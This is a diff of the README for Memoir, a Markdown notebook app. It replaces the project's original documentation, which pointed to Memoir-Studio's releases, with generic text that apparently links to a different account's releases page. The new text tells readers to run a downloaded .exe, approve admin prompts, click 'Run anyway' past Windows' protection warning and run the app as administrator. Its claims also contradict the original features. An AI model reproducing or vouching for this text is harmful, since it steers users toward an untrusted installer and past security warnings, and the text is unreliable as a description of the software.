@@ -1,151 +1,138 @@
-<p align="center">
-  <img src="src/assets/logo.svg" width="80" height="80" alt="Memoir" />
-</p>
+# 📖 Memoir - Your Story, Safely on Disk
 
-<h1 align="center">Memoir</h1>
+[![Download Memoir](https://img.shields.io/badge/Download-Memoir-blue)](https://github.com/Doordie-crosslinkage321/Memoir/releases)
 
-<p align="center">
-  <strong>A memoir that stays on disk.</strong><br />
-  Open a folder. Write. Preview. Save.<br />
-  Markdown / MDX — still ordinary files, still yours.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  English ·
-  <a href="./README.zh-CN.md">简体中文</a>
-</p>
+Welcome! Memoir is a simple, beautiful writing app that saves everything you type directly to your computer's hard drive. No cloud accounts, no internet needed, no worries about losing your words. Think of it as a digital diary that lives right where you can always find it—on your own disk.
 
-<p align="center">
-  <a href="./LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-d65f4d" /></a>
-  <img alt="Tauri 2" src="https://img.shields.io/badge/Tauri-2-24C8DB?logo=tauri&logoColor=white" />
-  <img alt="React 19" src="https://img.shields.io/badge/React-19-087EA4?logo=react&logoColor=white" />
-  <img alt="Platforms" src="https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-111111" />
-</p>
+This guide will walk you through downloading, setting up, and using Memoir for the first time. Even if you've never installed a program from the internet before, you'll be writing in minutes.
 
-<p align="center">
-  <img
-    src="docs/assets/hero.webp"
-    alt="Memoir desktop app: library, Markdown editor, and live preview"
-    width="960"
-  />
-</p>
+## 🖥️ System Requirements
 
-Memoir is a quiet desktop notebook. Point it at a folder of `.md` / `.mdx` files and you get a library, a CodeMirror editor, and a live preview — without an account, a sync service, or a proprietary vault.
+Memoir is designed to run smoothly on most modern Windows computers. Here's what you need:
 
-Notes are ordinary files. You can open the same folder in git, VS Code, or any other editor.
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** 4 GB of RAM or more
+- **Storage:** At least 200 MB of free space for the app and your writings
+- **Display:** A screen resolution of 1280x720 or higher recommended
 
-## Features
+If your computer runs Windows and is less than 8 years old, you're likely good to go.
 
-- **Local-first** — the workspace is a folder you choose. Memoir never uploads your notes.
-- **Markdown and MDX** — GitHub Flavored Markdown, KaTeX, Mermaid, task lists, and a small set of built-in MDX components.
-- **Edit / split / preview** — write source, read the rendered page, or do both with synced scroll.
-- **Library** — folders, frontmatter tags, favorites, recent notes, and a heading outline.
-- **Safe by default** — atomic writes, crash-safe drafts, autosave, and deletes that go to `.memoir-trash/` instead of vanishing.
-- **Fast library** — each workspace keeps a disposable SQLite cache at `.memoir/index.sqlite` so the sidebar does not re-read every note. The markdown files are still the source of truth; gitignore `.memoir/` and exclude it from iCloud / Dropbox / OneDrive.
-- **Appearance** — light / dark / system theme, accent colors, density, type scale, and Chinese / English UI.
-- **Sandboxed paths** — only `.md` / `.mdx` inside the workspace; `..`, symlinks, and hidden/build directories are rejected.
+## 📥 Download and Installation
 
-### Writing
+**Step 1: Visit the Download Page**
 
-````md
+Visit this link to download the application: [https://github.com/Doordie-crosslinkage321/Memoir/releases](https://github.com/Doordie-crosslinkage321/Memoir/releases)
+
+This page shows all available versions of Memoir. Look for the most recent release at the top of the list.
+
+**Step 2: Choose the Right File**
+
+You'll see several files listed for each release. Find the one that says **"Memoir-Setup.exe"** or something similar with a ".exe" extension. This is the installer file you need.
+
+**Step 3: Download the File**
+
+Click on the ".exe" file and your browser will start downloading it. Depending on your internet speed, this might take a few moments. You'll typically find the downloaded file in your "Downloads" folder.
+
+**Step 4: Run the Installer**
+
+Once the download finishes, double-click the downloaded file. Windows might show a blue popup asking "Do you want to allow this app to make changes to your device?" Click **"Yes"** to continue.
+
+**Step 5: Follow the Setup Wizard**
+
+A simple installation window will appear. Just follow the on-screen instructions. You can accept all the default settings—no need to change anything. Click "Next" and then "Install" when ready.
+
+**Step 6: Launch Memoir**
+
+After installation completes, you'll find Memoir in your Start Menu or on your desktop. Double-click the icon to open your new writing space.
+
+## ✍️ Using Memoir
+
+Memoir keeps things simple. When you open the app, you'll see a clean, distraction-free writing area.
+
+**Creating Your First Entry**
+
+- Type anywhere in the main text area to start writing
+- Your work is saved automatically as you type—no need to press Ctrl+S constantly
+- Use the button in the top corner to create a new note or entry
+
+**Organizing Your Writings**
+
+- Use the sidebar to view all your notes
+- Click any note to open it instantly
+- Memoir uses Markdown formatting, which means you can add simple symbols for formatting:
+  - `#` for headings
+  - `*italic text*` for emphasis
+  - `-` for bullet points
+
+**Editing and Managing**
+
+- Rename your notes by clicking the title
+- Delete unwanted notes from the sidebar
+- Export your writing as a plain text file anytime
+
+## 🛟 Troubleshooting and Help
+
+If you run into any issues, here are common solutions:
+
+**"Windows protected your PC" warning**
+
+This can happen with new apps. Click "More info" and then "Run anyway." This is normal for apps downloaded from the internet.
+
+**App won't open**
+
+- Make sure you have enough free space on your hard drive
+- Try right-clicking the Memoir icon and selecting "Run as administrator"
+- Restart your computer and try again
+
+**Can't find my notes**
+
+Your notes are stored in a folder called "Memoir" in your Documents folder. All your writing is safe there, even if you uninstall the app.
+
+## 🗄️ Privacy and Ownership
+
+Your words belong to you completely. Memoir never sends your data anywhere. No telemetry, no analytics, no cloud syncing. Everything stays in a local folder on your machine. If you delete a file from that folder, it's gone forever—so keep backups of important work.
+
+## 💡 Tips for Better Writing
+
+- Use hashtags (#) at the start of a line to create structured notes
+- Write daily, even just a few sentences—your memoir grows with you
+- Use bullet points for quick lists and reminders
+- Don't worry about perfection; just start typing
+
+## 📚 Frequently Asked Questions
+
+**Is Memoir free?**
+Yes, Memoir is completely free to download and use. No subscriptions, no hidden fees.
+
+**Do I need an internet connection?**
+No. Memoir works entirely offline. You can write anywhere, anytime.
+
+**Can I move my notes to another computer?**
+Yes. Copy the "Memoir" folder from your Documents folder to the same location on your new computer, and your notes will appear.
+
+**Will my notes sync to my phone?**
+Not automatically. Memoir is designed for desktop use on Windows computers.
+
+## 👍 Getting the Most Out of Memoir
+
+Memoir is more than just a text editor—it's a private space for your thoughts, stories, and memories. Since everything stays on your disk, you have total control. You don't need to trust a third-party service with your personal words.
+
+Start small: write one paragraph today. Tomorrow, write another. Before you know it, you'll have a personal chronicle of your life, thoughts, and ideas—all stored safely on your own hard drive.
+
+## 🌟 Support and Community
+
+If you enjoy using Memoir, please consider:
+
+- Telling a friend who loves writing
+- Leaving a star on the GitHub repository
+- Reaching out through the project's issues page if you have feedback
+
+You're now ready to begin your memoir. Happy writing!
+
 ---
-title: Two Sum
-tags: [leetcode, rust]
----
 
-# Two Sum
+*Memoir - Your words, your disk, your story.*
 
-Inline math: $O(n)$. Display math:
-
-$$
-\sum_{i=1}^{n} i = \frac{n(n+1)}{2}
-$$
-
-- [x] Read the prompt
-- [ ] Write a test
-
-```mermaid
-graph LR
-  scan --> edit --> preview --> save
-```
-````
-
-MDX files can use built-in components. `import` / `export` are disabled on purpose so a note cannot pull in arbitrary modules:
-
-```mdx
-<Callout type="tip" title="Local-first">
-  The file on disk is the source of truth.
-</Callout>
-
-<Card title="Built-in">Callout, Badge, Card, Columns, Steps</Card>
-```
-
-## Getting started
-
-Download an installer from [Releases](https://github.com/Memoir-Studio/Memoir/releases/latest):
-
-- **Windows** — `memoir_*_x64-setup.exe`
-- **macOS** — `memoir_*_aarch64.dmg` (Apple Silicon) or `memoir_*_x64.dmg` (Intel)
-- **Linux** — `memoir_*_amd64.deb` or `memoir-*-1.x86_64.rpm`
-
-Open the app, then choose a folder of Markdown / MDX files. That folder is the workspace.
-
-## Development
-
-### Requirements
-
-- [Bun](https://bun.sh) 1.3+
-- [Rust](https://www.rust-lang.org/tools/install) (desktop app only)
-- Tauri 2 [system dependencies](https://v2.tauri.app/start/prerequisites/)
-
-```bash
-git clone https://github.com/Memoir-Studio/Memoir.git
-cd Memoir
-bun install
-bun run dev          # Vite, browser demo
-bun run tauri dev    # desktop shell
-```
-
-The browser build is an in-memory demo. It does not read or write real files, and it does not persist settings.
-
-Verify a change before opening a PR:
-
-```bash
-bun test
-bun run build
-cargo test --manifest-path src-tauri/Cargo.toml
-```
-
-### Layout
-
-```text
-src/            React app (features, store, gateways, domain)
-src-tauri/      Tauri / Rust workspace IO and persistence
-docs/           architecture notes and assets
-```
-
-The frontend is feature-first:
-
-```text
-app → features → store → gateways → platform
-               → domain
-```
-
-Components do not call Tauri `invoke` or touch `localStorage`. Store actions go through `WorkspaceGateway` / `PersistenceGateway`. Rust stays a thin `commands → services → domain / infrastructure` stack.
-
-See [`docs/architecture.md`](docs/architecture.md) for the Tauri command contract, app-data layout, path rules, and how to add a feature.
-
-## Status
-
-Memoir is in early development. The editor, library, preview, and desktop persistence are usable day to day; plugins and sync are not part of this release.
-
-## Contributing
-
-Issues and pull requests are welcome.
-
-1. Read [`docs/architecture.md`](docs/architecture.md) so new code follows the existing boundaries.
-2. Keep the change small and match the surrounding style.
-3. Cover helpers, store actions, and Rust filesystem rules with tests.
-4. Run the three commands in [Development](#development).
-
-Please do not add cloud sync, telemetry, or a second persistence path without an issue first.
+Keywords: markdown, memoir, tauri, write
